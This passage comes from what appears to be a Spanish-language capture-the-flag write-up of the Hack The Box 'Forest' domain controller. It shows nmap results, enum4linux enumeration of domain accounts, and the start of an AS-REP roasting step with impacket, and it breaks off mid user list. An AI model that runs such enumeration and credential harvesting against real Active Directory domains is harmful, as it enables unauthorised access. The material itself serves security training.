389/tcp   open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: htb.local, Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: HTB&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: htb.local, Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.70%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10/25%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5DB2843D%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DNS
SF:VersionBindReqTCP,20,&lt;span class=&#34;s2&#34;&gt;&amp;#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x04bind\0\0\x10\0\x03&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Service Info: Host: FOREST&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 2h27m49s, deviation: 4h02m51s, median: 7m36s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-os-discovery: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS: Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard 6.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Computer name: FOREST
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS computer name: FOREST&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Domain name: htb.local
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Forest name: htb.local
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   FQDN: FOREST.htb.local
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System time: 2019-10-24T22:23:05-07:00
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: &amp;lt;blank&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled and required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2019-10-25 01:22:33
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2019-10-25 00:22:54

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Oct 25 01:16:55 2019 -- 1 IP address (1 host up) scanned in 529.48 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;enum4linux&#34;&gt;ENUM4LINUX&lt;/h2&gt;
&lt;p&gt;Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/forest# enum4linux -U -l 10.10.10.161 
Starting enum4linux v0.8.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; http://labs.portcullis.co.uk/application/enum4linux/ &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; on Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 04:31:58 &lt;span class=&#34;nv&#34;&gt;2019&lt;/span&gt;

 &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Target Information    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
Target ........... 10.10.10.161
RID Range ........ 500-550,1000-1050
Username ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Password ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, &lt;span class=&#34;nv&#34;&gt;none&lt;/span&gt;


 &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Enumerating Workgroup/Domain on 10.10.10.161    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;E&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t find workgroup/domain
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Session Check on 10.10.10.161    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Server 10.10.10.161 allows sessions using username &amp;#39;&amp;#39;, password &amp;#39;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
Use of uninitialized value &lt;span class=&#34;nv&#34;&gt;$global_workgroup&lt;/span&gt; in concatenation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 451.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Got domain/workgroup name: 

 &lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Getting information via LDAP &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Long domain name &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161: htb.local
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.10.161 appears to be a root/parent &lt;span class=&#34;nv&#34;&gt;DC&lt;/span&gt;

 &lt;span class=&#34;o&#34;&gt;===========================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Getting domain SID &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;===========================================&lt;/span&gt; 
Use of uninitialized value &lt;span class=&#34;nv&#34;&gt;$global_workgroup&lt;/span&gt; in concatenation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 359.
Domain Name: HTB
Domain Sid: S-1-5-21-3072663084-364016917-1341370565
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Host is part of a domain &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;not a workgroup&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

 &lt;span class=&#34;o&#34;&gt;=============================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Users on 10.10.10.161    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;=============================&lt;/span&gt; 
Use of uninitialized value &lt;span class=&#34;nv&#34;&gt;$global_workgroup&lt;/span&gt; in concatenation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 866.
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: &lt;span class=&#34;nv&#34;&gt;$331000&lt;/span&gt;-VK4ADACQNUCA	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator	Name: Administrator	Desc: Built-in account &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: Built-in account &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; guest access to the computer/domain
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi	Name: Santi Rodriguez	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien	Name: Sebastien Caron	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb	Name: Microsoft Exchange Migration	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb	Name: SystemMailbox&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;8cc370d3-822a-4ab8-a926-bb94bd0641a9&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb	Name: Microsoft Exchange Approval Assistant	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18	Name: Discovery Search Mailbox	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a	Name: Microsoft Exchange	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb	Name: E4E Encryption Store - Active	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549	Name: Microsoft Exchange Federation Mailbox	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b	Name: Microsoft Exchange	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b	Name: Microsoft Exchange	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

Use of uninitialized value &lt;span class=&#34;nv&#34;&gt;$global_workgroup&lt;/span&gt; in concatenation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 881.
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Administrator&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f4&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Guest&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f5&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;krbtgt&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f6&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DefaultAccount&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f7&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sebastien&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x479&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;lucinda&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x47a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;svc-alfresco&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x47b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;andy&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x47e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;mark&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x47f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;santi&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x480&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
enum4linux &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt; on Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 04:32:35 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;kerberos---impacket-getnpusers&#34;&gt;KERBEROS - impacket GetNPUsers&lt;/h1&gt;
&lt;p&gt;Obtuvimos poca informacion sobre el puerto de ldap, pero obtuvimos una lista de usuarios, vamos al puerto 88 de autenticacion de kerberos para obtener informacion sobre ese puerto utilizando la lista de usuarios y uno de los scripts de impacket para verificar si uno de los usuarios nos permite recolectar mensajes AS_REP sin pre autenticacion.&lt;/p&gt;
&lt;p&gt;Lista de Usuarios:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Administrator
Guest
krbtgt
DefaultAccount
&lt;span class=&#34;nv&#34;&gt;$331000&lt;/span&gt;-VK4ADACQNUCA
SM_2c8eef0a09b545acb
